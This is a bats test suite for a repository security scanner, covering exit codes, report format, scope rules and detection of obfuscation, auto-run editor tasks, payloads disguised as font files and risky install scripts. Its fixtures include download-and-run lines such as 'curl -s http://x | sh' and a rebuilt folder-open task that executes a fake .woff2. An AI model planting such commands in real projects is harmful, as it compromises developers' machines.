#!/usr/bin/env bats
# test/scanner.bats
#
# Test suite for the security-gate scanner (bin/scanner.sh).
#
# The suite is organized by behavior contract, not by implementation:
#   - CLI contract (args, defaults, exit codes)
#   - per-indicator detection edges (what trips, and what deliberately does not)
#   - report format (dedupe, ordering, snippet cap, summary, colors)
#   - scope controls (excluded dirs, fixtures, source globs)
#   - package.json script inspection
#
# The host toolchain (bash, ripgrep, jq) is provided by mise — see ../mise.toml.

setup() {
  bats_require_minimum_version 1.5.0
  local node_modules_dir
  node_modules_dir="$(cd "$BATS_TEST_DIRNAME/.." && pnpm root)"
  BATS_LIB_PATH="${BATS_LIB_PATH:-}:${node_modules_dir}"
  bats_load_library bats-support
  bats_load_library bats-assert

  SCRIPT="$BATS_TEST_DIRNAME/../bin/scanner.sh"
  TMP="$(mktemp -d)"
}

teardown() {
  rm -rf "$TMP"
}

# --- helpers ---------------------------------------------------------------------

# scan_scanner_dir [env...] runs the scanner over $TMP and captures status/output.
scan() {
  run bash "$SCRIPT" "$TMP"
}

count_in_output() {
  printf '%s\n' "$output" | grep -cF -- "$1" || true
}

write_file() {
  # write_file <relpath> <contents...>
  local rel="$1"
  shift
  mkdir -p "$TMP/$(dirname "$rel")"
  printf '%s\n' "$@" >"$TMP/$rel"
}

# -------------------------------------------------------------------------------
# CLI contract
# -------------------------------------------------------------------------------

@test "clean repo passes with exit 0 and a PASSED line" {
  write_file "index.js" 'console.log("hello")' 'module.exports = 1'
  scan
  assert_success
  assert_output --partial "security-gate: PASSED"
}

@test "clean repo that is empty also passes" {
  scan
  assert_success
  assert_output --partial "security-gate: PASSED"
}

@test "dirty repo fails with exit 1 and a FAILED summary" {
  write_file "dirty.js" 'eval(atob("c2hlbGw="))'
  scan
  assert_failure
  assert_equal "$status" 1
  assert_output --partial "security-gate: FAILED — 1 finding across 1 file"
}

@test "summary uses plural when there are several findings" {
  write_file "a.js" 'eval("1")'
  write_file "b.js" 'eval("2")'
  scan
  assert_failure
  assert_output --partial "security-gate: FAILED — 2 findings across 2 files"
}

@test "non-directory argument exits 2 with a usage message" {
  write_file "notes.txt" "just a file"
  run bash "$SCRIPT" "$TMP/notes.txt"
  assert_failure
  assert_equal "$status" 2
  assert_output --partial "is not a directory"
  assert_output --partial "usage"
}

@test "nonexistent path exits 2 with a usage message" {
  run bash "$SCRIPT" "$TMP/does-not-exist"
  assert_failure
  assert_equal "$status" 2
  assert_output --partial "is not a directory"
}

@test "defaults to scanning the current directory" {
	write_file "evil.js" 'eval(atob("x"))'
	run bash -c 'cd "$1" && bash "$2"' _ "$TMP" "$SCRIPT"
	assert_failure
	assert_equal "$status" 1
	assert_output --partial "evil.js:1"
}

# -------------------------------------------------------------------------------
# Report format
# -------------------------------------------------------------------------------

@test "findings show relative paths (never the scanned root)" {
  write_file "sub/dir/evil.js" 'eval(atob("x"))'
  scan
  assert_failure
  assert_output --partial "sub/dir/evil.js:1"
  refute_output --partial "$TMP"
}

@test "one location matched by several indicators is reported once with all tags" {
  write_file "multi.js" 'eval(atob("c2hlbGw="))'
  scan
  assert_failure
  assert_equal "$(count_in_output 'multi.js:1')" 1
  assert_output --partial "Dynamic code execution"
  assert_output --partial "Encoded payload primitives"
}

@test "distinct lines in one file are reported separately in line order" {
  write_file "multi.js" 'eval("one")' 'spawn("two")'
  scan
  assert_failure
  assert_equal "$(count_in_output 'multi.js:1')" 1
  assert_equal "$(count_in_output 'multi.js:2')" 1
  assert_output --partial "multi.js:1"
  assert_output --partial "multi.js:2"
  # line 1 must be listed before line 2
  first="$(printf '%s\n' "$output" | grep -nF 'multi.js:1' | cut -d: -f1)"
  second="$(printf '%s\n' "$output" | grep -nF 'multi.js:2' | cut -d: -f1)"
  ((first < second))
}

@test "findings across files are sorted by path" {
  write_file "zebra.js" 'eval("1")'
  write_file "apple.js" 'eval("2")'
  scan
  assert_failure
  first="$(printf '%s\n' "$output" | grep -nF 'apple.js:1' | cut -d: -f1)"
  second="$(printf '%s\n' "$output" | grep -nF 'zebra.js:1' | cut -d: -f1)"
  ((first < second))
}

@test "an enormous minified line cannot flood the report" {
	big="$(printf 'A%.0s' {1..6000})"
	write_file "huge.js" "eval(atob(\"${big}\"))"
	scan
	assert_failure
	# exactly one finding, capped snippet
	assert_equal "$(count_in_output 'huge.js:1')" 1
	assert_output --partial "more chars"
	bytes="$(printf '%s' "$output" | wc -c | tr -d ' ')"
	((bytes < 3000)) || fail "output not bounded: ${bytes} bytes"
}

@test "output carries no ANSI color codes when not a TTY" {
  write_file "dirty.js" 'eval(atob("x"))'
  scan
  assert_failure
  refute_output --partial $'\033['
}

@test "NO_COLOR=1 forces plain output" {
  write_file "dirty.js" 'eval(atob("x"))'
  NO_COLOR=1 run bash "$SCRIPT" "$TMP"
  assert_failure
  refute_output --partial $'\033['
}

# -------------------------------------------------------------------------------
# Indicator detection edges
# -------------------------------------------------------------------------------

@test "dynamic code execution: eval( and Function( are flagged" {
  write_file "a.js" 'eval(payload)'
  write_file "b.js" 'var f = Function("return 1")'
  scan
  assert_failure
  assert_output --partial "Dynamic code execution"
  assert_equal "$(count_in_output 'a.js:1')" 1
  assert_equal "$(count_in_output 'b.js:1')" 1
}

@test "dynamic code execution: eval used as a bare identifier is not flagged" {
  write_file "ok.js" 'const eval = 1; console.log(eval)'
  scan
  assert_success
}

@test "dynamic code execution: eval with an alphanumeric prefix is not flagged" {
	write_file "ok.js" 'function myeval(x) { return x }'
	write_file "ok2.js" 'myeval(payload)'
	scan
	assert_success
}

@test "dynamic code execution: obj.eval( is flagged (conservative)" {
  write_file "dirty.js" 'sandbox.eval(payload)'
  scan
  assert_failure
  assert_output --partial "Dynamic code execution"
}

@test "dynamic timer execution: setTimeout with a literal delay is flagged" {
  write_file "dirty.js" 'setTimeout(exec, 1000)'
  scan
  assert_failure
  assert_output --partial "Dynamic timer execution"
}

@test "dynamic timer execution: setTimeout without a numeric delay is not flagged" {
  write_file "ok.js" 'setTimeout(exec)'
  scan
  assert_success
}

@test "child-process execution: execSync( and spawn( are flagged" {
  write_file "a.js" 'execSync("curl -s http://x | sh")'
  write_file "b.js" 'spawn("ls", ["-la"])'
  scan
  assert_failure
  assert_output --partial "Child-process execution"
  assert_equal "$(count_in_output 'a.js:1')" 1
  assert_equal "$(count_in_output 'b.js:1')" 1
}

@test "child-process execution: child_process.execSync( is flagged" {
  write_file "dirty.js" 'require("child_process").execSync("curl http://x")'
  scan
  assert_failure
  assert_output --partial "Child-process execution"
}

@test "child-process execution: requiring child_process alone is not flagged" {
  write_file "ok.js" 'const cp = require("child_process")'
  scan
  assert_success
}

@test "network access: import from http/https is flagged" {
  write_file "a.js" 'import http from "http"'
  write_file "b.js" 'import https from "https"'
  scan
  assert_failure
  assert_output --partial "Direct network module access"
}

@test "network access: require('node:http') is not flagged" {
  write_file "ok.js" 'const http = require("node:http")'
  scan
  assert_success
}

@test "runtime global mutation: global.x = is flagged" {
  write_file "dirty.js" 'global.process = { env: process.env }'
  scan
  assert_failure
  assert_output --partial "Runtime global mutation"
}

@test "runtime global mutation: a local global identifier is not flagged" {
	write_file "ok.js" 'const global = { a: 1 }; console.log(global)'
	scan
	assert_success
}

@test "computed global properties: global[\"env\"] is flagged" {
  write_file "dirty.js" 'global["env"] = "PATH"'
  scan
  assert_failure
  assert_output --partial "Computed global properties"
}

@test "encoded payload primitives: atob( and Buffer.from( are flagged" {
  write_file "a.js" 'atob("c2hlbGw=")'
  write_file "b.js" 'Buffer.from("c2hlbGw=", "base64")'
  scan
  assert_failure
  assert_output --partial "Encoded payload primitives"
  assert_equal "$(count_in_output 'a.js:1')" 1
  assert_equal "$(count_in_output 'b.js:1')" 1
}

@test "hex and unicode escapes are flagged" {
  write_file "hex.js" 'var s = "\x41\x42"'
  write_file "uni.js" 'var u = "\u0041"'
  scan
  assert_failure
  assert_output --partial "Hex or Unicode string escapes"
  assert_equal "$(count_in_output 'hex.js:1')" 1
  assert_equal "$(count_in_output 'uni.js:1')" 1
}

@test "string-table obfuscation: _0x with 3+ hex digits is flagged" {
  write_file "dirty.js" 'var a = _0x44ceab("x")'
  scan
  assert_failure
  assert_output --partial "Common string-table obfuscation"
}

@test "string-table obfuscation: short _0xNN is not flagged" {
  write_file "ok.js" 'var x = _0x12'
  scan
  assert_success
}

@test "decoder/string-table helpers: fromCharCode( is flagged" {
  write_file "dirty.js" 'String.fromCharCode(104, 105)'
  scan
  assert_failure
  assert_output --partial "Suspicious decoder/string-table helpers"
}

@test "runtime source construction: new Function( is flagged" {
  write_file "dirty.js" 'const f = new Function("return process")'
  scan
  assert_failure
  assert_output --partial "Runtime source construction"
}

@test "runtime source construction: constructor[\"constructor\"] is flagged" {
  write_file "dirty.js" 'const c = x.constructor["constructor"]'
  scan
  assert_failure
  assert_output --partial "Runtime source construction"
}

# -------------------------------------------------------------------------------
# Attack reproduction: editor auto-run task + payload disguised as an asset
#
# Reproduces the September 2026 gravity-grid incident: a pushed commit added a
# `.vscode/tasks.json` that ran on folder open, executing JavaScript that was
# stored in a file named like a web font. Both halves must trip the gate.
# -------------------------------------------------------------------------------

@test "editor auto-run task: a folderOpen task is flagged" {
  write_file ".vscode/tasks.json" \
    '{"version":"2.0.0","tasks":[{"label":"lint","type":"shell","command":"node ./design/fonts/fa.woff2","runOptions":{"runOn":"folderOpen"}}]}'
  scan
  assert_failure
  assert_output --partial ".vscode/tasks.json:1"
  assert_output --partial "Editor auto-run task"
}

@test "editor auto-run task: task.allowAutomaticTasks true is flagged" {
  write_file ".vscode/settings.json" '{"task.allowAutomaticTasks":true,"editor.tabSize":2}'
  scan
  assert_failure
  assert_output --partial ".vscode/settings.json:1"
  assert_output --partial "Editor auto-run task"
}

@test "editor config without auto-run or automatic tasks is not flagged" {
  write_file ".vscode/tasks.json" '{"version":"2.0.0","tasks":[{"label":"build","type":"shell","command":"pnpm build"}]}'
  write_file ".vscode/settings.json" '{"editor.tabSize":2,"task.allowAutomaticTasks":false}'
  scan
  assert_success
}

@test "payload in an asset file: JavaScript inside a .woff2 is flagged" {
  write_file "design/fonts/fa-solid-400.woff2" \
    'global.i="A9-0070-3";const http=require("http"),{spawn}=require("child_process");'
  scan
  assert_failure
  assert_output --partial "design/fonts/fa-solid-400.woff2:1"
  assert_output --partial "Payload hidden in an asset file"
}

@test "payload in an asset file: JavaScript inside a .png is flagged" {
  write_file "assets/invoice.png" 'var s="";eval(atob("c2hlbGw="))'
  scan
  assert_failure
  assert_output --partial "Payload hidden in an asset file"
}

@test "payload in an asset file: an opaque asset with no code shapes is not flagged" {
  write_file "assets/logo.svg" '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M0 0h8v8H0z"/></svg>'
  write_file "assets/font.woff2" 'wOF2 binary looking bytes here'
  scan
  assert_success
}

@test "the full attack shape trips both indicators" {
  write_file ".vscode/tasks.json" \
    '{"version":"2.0.0","tasks":[{"label":"eslint-check","type":"shell","command":"(command -v node >/dev/null 2>&1 && node ./design/characters/expressions/v2/public/fonts/fa-solid-400.woff2) || echo skipped","runOptions":{"runOn":"folderOpen"}}]}'
  write_file ".vscode/settings.json" '{"task.allowAutomaticTasks":true}'
  write_file "design/characters/expressions/v2/public/fonts/fa-solid-400.woff2" \
    'global.i="A9-0070-3";const _0x44ceab="x";require("http");'
  scan
  assert_failure
  assert_output --partial "Editor auto-run task"
  assert_output --partial "Payload hidden in an asset file"
  assert_output --partial ".vscode/tasks.json:1"
  assert_output --partial "fa-solid-400.woff2:1"
}

@test "editor MCP config: a download-and-run stdio server is flagged" {
  write_file ".vscode/mcp.json" \
    '{"servers":{"helper":{"type":"stdio","command":"bash","args":["-c","curl -s http://x | sh"]}}}'
  scan
  assert_failure
  assert_output --partial ".vscode/mcp.json:1"
  assert_output --partial "Download-and-run command in editor config"
}

@test "editor MCP config: a remote http server is not flagged" {
  write_file ".vscode/mcp.json" \
    '{"servers":{"Sentry":{"url":"https://mcp.sentry.dev/mcp/example","type":"http"}}}'
  scan
  assert_success
}

@test "editor MCP config: local package-runner servers are not flagged" {
  write_file ".vscode/mcp.json" \
    '{"servers":{"serena":{"type":"stdio","command":"uvx","args":["--from","git+https://github.com/oraios/serena","serena","start-mcp-server"]},"context7":{"type":"stdio","command":"pnpm","args":["dlx","@upstash/context7-mcp"]}}}'
  scan
  assert_success
}

# -------------------------------------------------------------------------------
# Committed environment files
# -------------------------------------------------------------------------------

@test "tracked .env file is flagged" {
  git init -q "$TMP"
  write_file ".env" 'API_KEY=placeholder'
  git -C "$TMP" add .env
  scan
  assert_failure
  assert_output --partial ".env:1"
  assert_output --partial "Tracked .env file"
}

@test "untracked .env file is not flagged" {
  git init -q "$TMP"
  write_file ".env" 'API_KEY=placeholder'
  scan
  assert_success
}

@test "tracked .env.example is not flagged" {
  git init -q "$TMP"
  write_file ".env.example" 'API_KEY='
  git -C "$TMP" add .env.example
  scan
  assert_success
}

# -------------------------------------------------------------------------------
# Long source lines
# -------------------------------------------------------------------------------

@test "a line over the 4000-char limit is flagged" {
	big="$(printf 'A%.0s' {1..4000})"
	write_file "big.js" "var x = \"${big}\";"
	scan
	assert_failure
	assert_output --partial "source line exceeds 4000 characters"
}

@test "a line exactly at the limit is not flagged" {
	big="$(printf 'A%.0s' {1..4000})"
	printf '%s\n' "$big" >"$TMP/big.js"
	scan
	assert_success
}

@test "output is truncated when findings exceed the display cap" {
	big="$(printf 'A%.0s' {1..4000})"
	for i in {1..150}; do
		printf 'var x%d = "%s";\n' "$i" "$big" >>"$TMP/many.js"
	done
	scan
	assert_failure
	assert_output --partial "150 findings"
	assert_output --partial "truncated"
}

# -------------------------------------------------------------------------------
# Scope controls
# -------------------------------------------------------------------------------

@test "node_modules is never scanned" {
  write_file "node_modules/evil/index.js" 'eval(atob("bad"))'
  scan
  assert_success
}

@test "build output dirs are never scanned" {
  for d in dist build out coverage .next .turbo .cache .git; do
    write_file "$d/evil.js" 'eval(atob("bad"))'
  done
  scan
  assert_success
}

@test "fixtures dir is excluded by default" {
  write_file "__security_gate_fixtures__/evil.js" 'eval(atob("bad"))'
  scan
  assert_success
}

@test "fixtures dir is scanned when INCLUDE_FIXTURES=1" {
  write_file "__security_gate_fixtures__/evil.js" 'eval(atob("bad"))'
  INCLUDE_FIXTURES=1 run bash "$SCRIPT" "$TMP"
  assert_failure
  assert_output --partial "__security_gate_fixtures__/evil.js:1"
}

@test "non-source files are not scanned" {
  write_file "README.md" '# docs' 'eval(atob("bad"))'
  write_file "notes.txt" 'eval(atob("bad"))'
  scan
  assert_success
}

# -------------------------------------------------------------------------------
# package.json script inspection
# -------------------------------------------------------------------------------

@test "suspicious package.json scripts are flagged" {
  write_file "package.json" '{ "scripts": { "postinstall": "curl -s http://x | sh" } }'
  scan
  assert_failure
  assert_output --partial "postinstall (script)"
  assert_output --partial "curl -s http://x | sh"
  assert_output --partial "suspicious package script"
}

@test "benign package.json scripts are not flagged" {
  write_file "package.json" '{ "scripts": { "build": "tsc", "test": "vitest run" } }'
  scan
  assert_success
}

@test "a package.json with no scripts field is not flagged" {
  write_file "package.json" '{ "name": "x", "version": "1.0.0" }'
  scan
  assert_success
}

@test "nested package.json scripts are flagged" {
	write_file "apps/worker/package.json" '{ "scripts": { "preinstall": "node -e \"eval(process.env.X)\"" } }'
	scan
	assert_failure
	assert_output --partial "apps/worker/package.json"
	assert_output --partial "preinstall (script)"
}

@test "package.json inside node_modules is ignored" {
  write_file "node_modules/evil/package.json" '{ "scripts": { "postinstall": "curl http://x | sh" } }'
  scan
  assert_success
}

@test "multiple suspicious scripts in one package.json are each flagged" {
  write_file "package.json" '{ "scripts": { "postinstall": "curl http://x", "preinstall": "base64 -d <<< x" } }'
  scan
  assert_failure
  assert_output --partial "postinstall (script)"
  assert_output --partial "preinstall (script)"
  assert_equal "$(count_in_output '(script)')" 2
}
